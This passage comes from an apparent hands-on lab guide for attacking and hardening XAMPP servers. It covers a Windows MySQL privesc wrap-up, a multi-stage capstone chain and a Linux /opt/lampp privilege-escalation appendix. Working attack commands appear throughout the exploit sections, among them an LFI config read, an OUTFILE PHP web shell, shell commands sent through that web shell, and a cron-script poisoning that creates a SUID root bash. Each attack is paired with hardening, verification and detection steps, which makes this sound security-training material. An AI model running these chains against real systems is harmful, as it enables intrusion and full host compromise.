C:\> icacls C:\xampp\mysql\lib\plugin /inheritance:r /grant "Administrators:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
```

Plus E7's fixes (strong root, `secure_file_priv` so `INTO DUMPFILE` can't reach the plugin
dir). Restart MySQL. Snapshot `hardened-e10d`.

**§6 Verify.** `sc qc mysql` → `svc_mysql`; `SELECT ... INTO DUMPFILE 'C:/xampp/mysql/lib/
plugin/x.dll'` now fails with a `secure-file-priv`/permission error; `sys_exec` can't be
installed. Even if it were, it would run as `svc_mysql`, not SYSTEM.

**§7 Detect.** MariaDB log: `CREATE FUNCTION ... SONAME`, `INTO DUMPFILE` to the plugin dir.
Event ID 4720 (user account created) / 4732 (added to Administrators) with the *mysqld*
process lineage — a DB engine creating an admin user is a glaring IoC.

**🎓 Lesson.** A privileged DB service is a privileged *code-execution* service (via UDF).
Run data services as least-privilege accounts, lock the plugin directory, and restrict file
writes — the same "don't run as SYSTEM + least privilege on writable paths" theme as the
Apache vectors. Across all four sub-vectors the meta-fix is identical: **least-privilege
service accounts and correct ACLs**.

---

# EXERCISE 11 — The Multi-Stage Attack Chain (Capstone)

> **Precondition:** several earlier vulnerabilities present at once (built by stacking §3s).
> **Layer:** all — the point is chaining across layers.
> **Privilege needed:** none → SYSTEM.
> **MITRE ATT&CK:** T1595 → T1190 → T1552 → T1078 → T1068 (a full chain).
> **Exam relevance:** very high — exam boxes are chains; this rehearses the whole descent.
> **Course scenario:** S12 (Multi-stage chain).

## §1 What it is

No single bug gives root. You chain: **vhost discovery → LFI source disclosure → DB
credentials → phpMyAdmin OUTFILE → web shell → privilege escalation**, exactly like a real
assessment. This exercise is about *assembling* the primitives from E2–E10 into one path, then
hardening the chain and proving each break severs it.

## §2 Why it works

Each layer's output is the next layer's input (course Part I's layer ladder): the vhost hides
the vulnerable app; the app's LFI leaks the config source; the config yields DB creds; the
creds open phpMyAdmin; OUTFILE writes a shell; the shell runs as a service account you then
escalate. The chain works because *every link is independently weak* — which is also why
breaking *any one* link defeats it (the defence lesson).

## §3 Make it vulnerable

From `baseline-app-deployed`, stack the vulnerable states of several exercises:

- E9 §3 — create the `dev.app.lab` vhost with the weak dev app.
- E4 §3 — the dev app's `index.php` has the unsanitised LFI.
- E1 §3 — `display_errors On` (leaks the web root path).
- E7 §3 — phpMyAdmin reachable, blank root, `FILE`, empty `secure_file_priv`.
- E10a — Apache as Local System (so the final shell is SYSTEM), *or* E10b setup (svc_apache +
  SeImpersonate) if you want to practise the Potato finish.

Snapshot `vuln-e11`.

## §4 Exploit it (the full chain)

```bash
# 1) Default site looks empty → find the vhost (E9)
$ curl -s http://192.168.56.10/ | grep -i 'dev\.'          # or cert SAN / ffuf
$ echo "192.168.56.10 dev.app.lab" | sudo tee -a /etc/hosts

# 2) LFI on the dev app → read config source → DB creds (E4)
$ curl -s "http://dev.app.lab/index.php?page=php://filter/convert.base64-encode/resource=config.php" \
    | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
appuser / Autumn2026!    (and note the web root from an error → C:\xampp\htdocs\dev)

# 3) phpMyAdmin: blank root (or the appuser creds) → confirm FILE + secure_file_priv (E7)
$ mysql -h 192.168.56.10 -u root   # blank; SHOW GRANTS; SELECT @@secure_file_priv;

# 4) OUTFILE a web shell into the dev web root
MariaDB> SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE 'C:/xampp/htdocs/dev/s.php';
$ curl -s "http://dev.app.lab/s.php?c=whoami"
nt authority\system            # (E10a) — or svc_apache → Potato to SYSTEM (E10b)

# 5) If svc_apache: escalate (E10b)
$ curl -s "http://dev.app.lab/s.php?c=C:\Windows\Temp\ps.exe -i -c whoami"   # SYSTEM
# 6) Loot: decrypt nothing needed here — grab both flags
$ curl -s "http://dev.app.lab/s.php?c=type C:\Users\Administrator\Desktop\proof.txt"
```

**Why:** you descended the ladder — each finding unlocked the next — reaching SYSTEM. Note how
credential **reuse** (`appuser` from the LFI worked at the DB) and the **service account**
(SYSTEM) were the pivots, exactly as the course predicts.

## §5 Harden it (break any link)

The defensive lesson of the capstone: **you don't need to fix everything to stop the chain —
severing one link defeats it.** Apply, and observe each independently blocking the path:

- Fix E9 → the vhost/dev app isn't reachable → chain dies at step 1.
- Fix E4 (LFI allow-list + `open_basedir`) → no source disclosure → dies at step 2.
- Fix E1 (`display_errors Off`) → web-root path not leaked → OUTFILE target unknown → step 4
  much harder.
- Fix E7 (root password, `secure_file_priv`, `Require local`) → no PMA/OUTFILE → dies at 3/4.
- Fix E10a (Apache not SYSTEM) → the shell is low-priv → no SYSTEM without a further, now-
  hardened, step.

For full defence, apply *all* of them. Snapshot `hardened-e11`.

## §6 Verify the fix

Re-run the chain end-to-end; show it breaking at the first hardened link, then confirm that
even if you hand-wave past one, the next hardened link stops it:

```bash
# With E9 fixed:
$ curl -s http://dev.app.lab/ -o /dev/null -w '%{http_code}\n'   → 403   # chain broken at step 1
# Temporarily re-open E9, but with E4 fixed:
$ curl -s "http://dev.app.lab/index.php?page=php://filter/...resource=config.php"  → Not found
# ... and so on: demonstrate each fix independently severs the chain.
```

## §7 Detect it

The chain leaves a *composite* trail a defender can correlate: Host-header fuzzing →
`php://filter` in `?page=` → `/phpmyadmin/` from a remote IP → `INTO OUTFILE` in the DB log →
`GET /dev/s.php?c=` → a web-spawned `ps.exe`/`cmd` as SYSTEM (4688/4672). Any *one* is
suspicious; the *sequence* from a single source IP within minutes is an unambiguous
intrusion. SIEM correlation across Apache, MariaDB, and Windows Security logs catches what any
single log might not.

## 🎓 Lesson

Real compromise is a chain, and the two defining moves are the ones the whole course and lab
keep returning to: **credential reuse** (the LFI-leaked `appuser` opened the DB) and the
**over-privileged service account** (Apache as SYSTEM made the shell SYSTEM). The defender's
gift is that a chain has many links: you rarely fix everything at once, but you don't have to
— *break one link and the chain fails.* Attacker mindset: assemble primitives across layers.
Defender mindset: you have multiple independent chances to stop them, and layered detection
turns the very length of the chain into your advantage.

---

# APPENDIX A — Linux XAMPP Privilege-Escalation Variant

> **Course scenario:** S11 (Linux privilege escalation). The main lab is Windows by your
> request; this appendix covers the one scenario that is inherently Linux, on a second VM,
> in the same vulnerable → exploit → harden → verify → detect → lesson format.

## A.1 Build the second VM

Add a Debian/Ubuntu VM `LNX-XAMPP` at `192.168.56.20` on the same host-only network. Install
XAMPP to `/opt/lampp` (`sudo ./xampp-linux-*-installer.run`), deploy the same vulnerable
`app/` from Part 0 into `/opt/lampp/htdocs/app`, and start it with `sudo /opt/lampp/lampp
start`. Get a web-user shell via any of E4/E5/E6 (the web code is identical). On Linux your
shell will be the XAMPP Apache user — commonly **`daemon`** or **`nobody`**, *not* `www-data`.
Snapshot `lnx-baseline`.

## A.2 The vulnerability — loose `/opt/lampp` permissions run by root

**§1/§2 What & why.** XAMPP on Linux historically ships `/opt/lampp` with famously loose
permissions, and the stack is started **by root** via `/opt/lampp/lampp`. If a script under
`/opt/lampp` that root executes (at start/stop, or via a root cron) is writable by your web-
user, you append a payload and it runs as root. This is XAMPP's signature Linux weakness — a
distro-packaged Apache under `/var/www` + `/etc/apache2` doesn't have it.

**§3 Make it vulnerable.** Reproduce the classic loose perms + a root cron:

```bash
# on LNX-XAMPP as root
$ chmod -R 777 /opt/lampp                       # the historically-loose state
$ cat >/opt/lampp/maintenance.sh <<'EOF'
#!/bin/bash
# pretend housekeeping run by root every minute
EOF
$ chmod 777 /opt/lampp/maintenance.sh
$ ( crontab -l 2>/dev/null; echo "* * * * * /opt/lampp/maintenance.sh" ) | crontab -   # root cron
```

Snapshot `lnx-vuln`.

**§4 Exploit it.** From the `daemon` web shell:

```bash
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
# find writable files under the XAMPP tree that root might run
$ find /opt/lampp -writable -type f 2>/dev/null | head
/opt/lampp/maintenance.sh
# confirm root runs it (upload & run pspy)
$ ./pspy64        # shows: UID=0  CMD=/bin/bash /opt/lampp/maintenance.sh   every minute
# poison it → root
$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/lampp/maintenance.sh
# wait ~1 min, then:
$ /tmp/rootbash -p
# id → uid=1(daemon) euid=0(root)  → ROOT
```

**Why:** a root-executed script was world-writable; appending to it ran your command as root.

**§5 Harden it.** Restore least privilege on the whole tree and the script; XAMPP's own
"security" script tightens defaults too:

```bash
$ chown -R root:root /opt/lampp
$ chmod -R go-w /opt/lampp                       # no group/other write anywhere
$ chmod 700 /opt/lampp/maintenance.sh            # only root can write/run
$ /opt/lampp/lampp security                       # sets XAMPP passwords + tightens access
# also drop the reused DB/app creds as OS passwords (Pattern B) — as in E8
```

Snapshot `lnx-hardened`.

**§6 Verify.**

```bash
$ find /opt/lampp -writable -type f 2>/dev/null   # (as daemon) → empty
$ echo x >> /opt/lampp/maintenance.sh             # Permission denied
# second tool: ls -la /opt/lampp/maintenance.sh → -rwx------ root root
```

**§7 Detect.** `pspy` (attacker tool, but shows a defender the risk): a root cron running a
world-writable script is the finding. On the box: file-integrity monitoring on `/opt/lampp`;
auditd `w -k` watches on `/opt/lampp/*.sh`; a new SUID file in `/tmp` (`/tmp/rootbash`) is a
glaring IoC (`find / -perm -4000 -newer /etc/hostname`).

**🎓 Lesson.** XAMPP-Linux's parallel `/opt/lampp` universe + loose perms + root-run scripts
is a direct daemon→root path a normal Apache lacks. The fix is ownership + `go-w` + running
`/opt/lampp/lampp security`. Same theme as the Windows vectors: privileged processes must not
execute anything a low-priv user can write.

---

# CLOSING — Master Reference Tables

## The exercise ↔ scenario ↔ hardening map

| Ex | Vulnerability | Course scenario | Core fix (the one-line inverse) |
|----|---------------|-----------------|---------------------------------|
| 1  | Info disclosure (errors/phpinfo) | S1 | `display_errors Off`, remove phpinfo, `ServerTokens Prod` |
| 2  | Apache misconfig (Indexes/PUT) | S2 | `-Indexes`, disable DAV, method allow-list |
| 3  | Source/backup/`.git` disclosure | S2/S8 | remove artefacts + deny `.git`/backup extensions + keep repos out of htdocs |
| 4  | LFI → source/log-poison RCE | S3 | include allow-list + `open_basedir` + `allow_url_*` off |
| 5  | Unrestricted upload → RCE | S6 | allow-list validation + random names + `engine off` in uploads |
| 6  | Command injection | S9 | input allow-list + `escapeshellarg` + `disable_functions` |
| 7  | phpMyAdmin OUTFILE → RCE | S4 | root password + `secure_file_priv` + `AllowNoPassword false` + `Require local` |
| 8  | Weak MySQL + credential reuse | S5 | localhost-bind DB + unique passwords everywhere |
| 9  | Hidden vhost / dev app | S7 | remove non-prod apps + `Require ip/local` + no hostname leaks |
| 10 | Windows privesc (A–D) | S10 | least-privilege service accounts + correct ACLs + `secure_file_priv` |
| 11 | Multi-stage chain | S12 | break any one link; apply all for depth |
| A  | Linux privesc (loose `/opt/lampp`) | S11 | `chown root`, `go-w`, `lampp security` |

## The snapshot map

```text
base-clean-windows          OS only
baseline-app-deployed       XAMPP + app + DB + users (HOME BASE — revert here to start any exercise)
vuln-e1 … vuln-e11          per-exercise vulnerable state (before §4)
hardened-e1 … hardened-e11  per-exercise fixed state (after §6)
vuln-e10a…d / hardened-e10a…d   the four privesc sub-vectors
lnx-baseline / lnx-vuln / lnx-hardened   the Linux appendix VM
```

## The "fully hardened XAMPP" checklist (all fixes at once)

Apply every §5 to reach a genuinely hardened box — a useful final state to snapshot as
`fully-hardened` and re-attack with all exercises to confirm each now fails:

- **PHP:** `display_errors Off`, `log_errors On`, `expose_php Off`, `allow_url_include Off`,
  `allow_url_fopen Off`, `open_basedir` set per-app, `disable_functions` for unused exec
  funcs, `file_uploads` off if unused.
- **Apache:** `ServerTokens Prod`, `ServerSignature Off`, `-Indexes` default, method
  allow-lists, deny `.git`/backup extensions, DAV off, uploads dir `engine off`, phpMyAdmin
  `Require local`, non-prod vhosts `Require ip`.
- **MySQL:** strong root password, `AllowNoPassword false`, `secure_file_priv` to a non-web
  dir, `bind-address 127.0.0.1`, drop `FILE` from app accounts, plugin dir non-writable.
- **Windows:** Apache & MySQL as dedicated **least-privilege service accounts** (not Local
  System), correct ACLs on `C:\xampp` (Users no write), install under Program Files, Defender
  on in production, unique passwords per account (no reuse).
- **Operational:** no backups/repos/dumps in the web root, no non-prod apps on prod, no
  internal hostnames in public certs/source, patch the stack.

## How this guide completes the arc

The course taught you to **recognise → enumerate → exploit** an unfamiliar XAMPP box. This
lab made you **build** each vulnerability, **break** it with your own hands, and — the new
movement — **defend** it and *prove* the defence. You now hold both sides: you can walk up to
a XAMPP target and see the attack paths, and you can walk up to a XAMPP deployment and see —
and close — the same paths before an attacker does. That is the whole point of Build →
Understand → Break → Defend: the attacker's map and the defender's map are the same map, read
in two directions.

*End of lab guide.*





